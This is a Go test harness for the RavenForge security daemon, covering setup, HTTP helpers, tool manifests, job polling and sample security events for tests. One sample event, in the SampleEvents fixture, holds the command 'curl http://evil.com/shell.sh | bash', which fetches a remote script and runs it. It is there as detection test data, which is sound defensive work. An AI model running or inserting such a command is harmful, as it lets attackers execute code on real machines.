package harness

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/ravenforge/ravenforge/core/internal/config"
	"github.com/ravenforge/ravenforge/core/internal/daemon"
	"go.uber.org/zap"
)

// TestHarness provides a complete test environment for RavenForge
type TestHarness struct {
	t       *testing.T
	tempDir string
	daemon  *daemon.Daemon
	baseURL string
	client  *http.Client
	logger  *zap.Logger
}

// NewTestHarness creates a new test harness
func NewTestHarness(t *testing.T) *TestHarness {
	t.Helper()

	tempDir, err := os.MkdirTemp("", "ravenforge-test-*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}

	logger, _ := zap.NewDevelopment()

	return &TestHarness{
		t:       t,
		tempDir: tempDir,
		baseURL: "http://localhost:18080",
		client: &http.Client{
			Timeout: 30 * time.Second,
		},
		logger: logger,
	}
}

// Setup initializes the test environment
func (h *TestHarness) Setup() {
	h.t.Helper()

	// Create directory structure
	dirs := []string{
		"artifacts",
		"audit",
		"tools",
		"data",
		"config",
	}

	for _, dir := range dirs {
		path := filepath.Join(h.tempDir, dir)
		if err := os.MkdirAll(path, 0755); err != nil {
			h.t.Fatalf("Failed to create dir %s: %v", dir, err)
		}
	}

	// Create test config
	cfg := &config.Config{
		Server: config.ServerConfig{
			Host:    "127.0.0.1",
			Port:    18080,
			Timeout: 30 * time.Second,
		},
		ToolDirs: []string{filepath.Join(h.tempDir, "tools")},
		Artifacts: config.ArtifactConfig{
			BaseDir: filepath.Join(h.tempDir, "artifacts"),
			MaxSize: 100 * 1024 * 1024,
		},
		Audit: config.AuditConfig{
			LogPath:    filepath.Join(h.tempDir, "audit", "audit.jsonl"),
			Enabled:    true,
			MaxSizeMB:  50,
			MaxBackups: 3,
			MaxAgeDays: 7,
		},
		Policy: config.PolicyConfig{
			DefaultMode: "audit",
		},
		Scheduler: config.SchedulerConfig{
			Workers:        2,
			MaxQueueSize:   50,
			DefaultTimeout: 60 * time.Second,
		},
		Sandbox: config.SandboxConfig{
			Runtime:        "docker",
			DockerSocket:   "",
			DefaultNetwork: "none",
			DefaultLimits: config.ResourceLimits{
				CPULimit:    1.0,
				MemoryLimit: 512 * 1024 * 1024,
				PidsLimit:   100,
				Timeout:     60 * time.Second,
			},
		},
		Database: config.DatabaseConfig{
			Driver: "sqlite3",
			Path:   filepath.Join(h.tempDir, "data", "ravenforge.db"),
		},
		Logging: config.LoggingConfig{
			Level:  "debug",
			Format: "json",
		},
	}

	// Initialize daemon
	var err error
	h.daemon, err = daemon.New(cfg, h.logger)
	if err != nil {
		h.t.Fatalf("Failed to create daemon: %v", err)
	}

	// Start daemon in background
	go func() {
		if err := h.daemon.Run(); err != nil {
			h.t.Logf("Daemon stopped: %v", err)
		}
	}()

	// Wait for server to be ready
	h.waitForServer()
}

// waitForServer waits for the API server to be ready
func (h *TestHarness) waitForServer() {
	h.t.Helper()

	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		resp, err := h.client.Get(h.baseURL + "/health")
		if err == nil {
			resp.Body.Close()
			if resp.StatusCode == http.StatusOK {
				return
			}
		}
		time.Sleep(100 * time.Millisecond)
	}
	h.t.Fatal("Timeout waiting for server to start")
}

// Teardown cleans up the test environment
func (h *TestHarness) Teardown() {
	h.t.Helper()

	if h.daemon != nil {
		h.daemon.Shutdown()
	}

	if h.tempDir != "" {
		os.RemoveAll(h.tempDir)
	}
}

// TempDir returns the temporary directory path
func (h *TestHarness) TempDir() string {
	return h.tempDir
}

// BaseURL returns the API base URL
func (h *TestHarness) BaseURL() string {
	return h.baseURL
}

// Request helper methods

// GET performs a GET request
func (h *TestHarness) GET(path string) (*http.Response, error) {
	return h.client.Get(h.baseURL + path)
}

// POST performs a POST request with JSON body
func (h *TestHarness) POST(path string, body interface{}) (*http.Response, error) {
	jsonBody, err := json.Marshal(body)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal body: %w", err)
	}

	return h.client.Post(
		h.baseURL+path,
		"application/json",
		bytes.NewReader(jsonBody),
	)
}

// DELETE performs a DELETE request
func (h *TestHarness) DELETE(path string) (*http.Response, error) {
	req, err := http.NewRequest("DELETE", h.baseURL+path, nil)
	if err != nil {
		return nil, err
	}
	return h.client.Do(req)
}

// ParseJSON parses JSON response body
func (h *TestHarness) ParseJSON(resp *http.Response, v interface{}) error {
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	return json.Unmarshal(body, v)
}

// Assertion helpers

// AssertStatus asserts the response status code
func (h *TestHarness) AssertStatus(resp *http.Response, expected int) {
	h.t.Helper()
	if resp.StatusCode != expected {
		body, _ := io.ReadAll(resp.Body)
		h.t.Errorf("Expected status %d, got %d: %s", expected, resp.StatusCode, string(body))
	}
}

// CreateTestTool creates a test tool manifest
func (h *TestHarness) CreateTestTool(name, category string) string {
	h.t.Helper()

	toolDir := filepath.Join(h.tempDir, "tools", category, name)
	if err := os.MkdirAll(toolDir, 0755); err != nil {
		h.t.Fatalf("Failed to create tool dir: %v", err)
	}

	manifest := fmt.Sprintf(`name: %s
version: "1.0.0"
description: Test tool for %s
author: Test Author
license: MIT
category: %s

inputs:
  data:
    type: stream
    format: jsonl
    description: Input data
    required: true

outputs:
  results:
    type: stream
    format: jsonl
    description: Output results

parameters:
  option:
    type: string
    description: Test option
    default: "default"

gates:
  network: false
  ai: false
  response_action: false
  secrets: false

resources:
  cpu: "0.5"
  memory: "256M"

timeout: 60
`, name, name, category)

	manifestPath := filepath.Join(toolDir, "tool.yaml")
	if err := os.WriteFile(manifestPath, []byte(manifest), 0644); err != nil {
		h.t.Fatalf("Failed to write manifest: %v", err)
	}

	return toolDir
}

// CreateTestArtifact creates a test artifact file
func (h *TestHarness) CreateTestArtifact(name, content string) string {
	h.t.Helper()

	path := filepath.Join(h.tempDir, "test-artifacts", name)
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		h.t.Fatalf("Failed to create artifact dir: %v", err)
	}

	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		h.t.Fatalf("Failed to write artifact: %v", err)
	}

	return path
}

// WaitForJob waits for a job to complete
func (h *TestHarness) WaitForJob(jobID string, timeout time.Duration) (map[string]interface{}, error) {
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		resp, err := h.GET("/v1/jobs/" + jobID)
		if err != nil {
			return nil, err
		}

		var job map[string]interface{}
		if err := h.ParseJSON(resp, &job); err != nil {
			return nil, err
		}

		status, _ := job["status"].(string)
		if status == "completed" || status == "failed" {
			return job, nil
		}

		time.Sleep(500 * time.Millisecond)
	}

	return nil, fmt.Errorf("timeout waiting for job %s", jobID)
}

// TestScenario represents a test scenario
type TestScenario struct {
	Name        string
	Description string
	Setup       func(h *TestHarness)
	Run         func(h *TestHarness)
	Verify      func(h *TestHarness)
	Cleanup     func(h *TestHarness)
}

// RunScenario executes a test scenario
func (h *TestHarness) RunScenario(scenario TestScenario) {
	h.t.Helper()
	h.t.Run(scenario.Name, func(t *testing.T) {
		if scenario.Setup != nil {
			scenario.Setup(h)
		}

		if scenario.Run != nil {
			scenario.Run(h)
		}

		if scenario.Verify != nil {
			scenario.Verify(h)
		}

		if scenario.Cleanup != nil {
			scenario.Cleanup(h)
		}
	})
}

// SampleEvents returns sample security events for testing
func SampleEvents() []map[string]interface{} {
	return []map[string]interface{}{
		{
			"@timestamp": time.Now().Add(-5 * time.Minute).Format(time.RFC3339),
			"message":    "Authentication failure for user admin",
			"event": map[string]interface{}{
				"category": []string{"authentication"},
				"type":     []string{"start"},
				"outcome":  "failure",
			},
			"source": map[string]interface{}{
				"ip": "192.168.1.100",
			},
			"user": map[string]interface{}{
				"name": "admin",
			},
			"host": map[string]interface{}{
				"name": "server-01",
			},
		},
		{
			"@timestamp": time.Now().Add(-4 * time.Minute).Format(time.RFC3339),
			"message":    "Authentication failure for user admin",
			"event": map[string]interface{}{
				"category": []string{"authentication"},
				"type":     []string{"start"},
				"outcome":  "failure",
			},
			"source": map[string]interface{}{
				"ip": "192.168.1.100",
			},
			"user": map[string]interface{}{
				"name": "admin",
			},
			"host": map[string]interface{}{
				"name": "server-01",
			},
		},
		{
			"@timestamp": time.Now().Add(-3 * time.Minute).Format(time.RFC3339),
			"message":    "Suspicious command detected: curl http://evil.com/shell.sh | bash",
			"event": map[string]interface{}{
				"category": []string{"process"},
				"type":     []string{"start"},
			},
			"source": map[string]interface{}{
				"ip": "10.0.0.50",
			},
			"user": map[string]interface{}{
				"name": "developer",
			},
			"host": map[string]interface{}{
				"name": "workstation-05",
			},
			"process": map[string]interface{}{
				"name":         "bash",
				"command_line": "curl http://evil.com/shell.sh | bash",
			},
		},
		{
			"@timestamp": time.Now().Add(-2 * time.Minute).Format(time.RFC3339),
			"message":    "Error: Database connection failed",
			"log": map[string]interface{}{
				"level": "error",
			},
			"event": map[string]interface{}{
				"category": []string{"database"},
				"type":     []string{"error"},
			},
			"host": map[string]interface{}{
				"name": "db-server-01",
			},
		},
	}
}

// WriteJSONLFile writes events to a JSONL file
func (h *TestHarness) WriteJSONLFile(path string, events []map[string]interface{}) {
	h.t.Helper()

	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		h.t.Fatalf("Failed to create dir: %v", err)
	}

	file, err := os.Create(path)
	if err != nil {
		h.t.Fatalf("Failed to create file: %v", err)
	}
	defer file.Close()

	for _, event := range events {
		line, err := json.Marshal(event)
		if err != nil {
			h.t.Fatalf("Failed to marshal event: %v", err)
		}
		file.Write(line)
		file.Write([]byte("\n"))
	}
}

// ReadJSONLFile reads events from a JSONL file
func (h *TestHarness) ReadJSONLFile(path string) []map[string]interface{} {
	h.t.Helper()

	data, err := os.ReadFile(path)
	if err != nil {
		h.t.Fatalf("Failed to read file: %v", err)
	}

	var events []map[string]interface{}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		var event map[string]interface{}
		if err := json.Unmarshal([]byte(line), &event); err != nil {
			h.t.Fatalf("Failed to unmarshal line: %v", err)
		}
		events = append(events, event)
	}

	return events
}
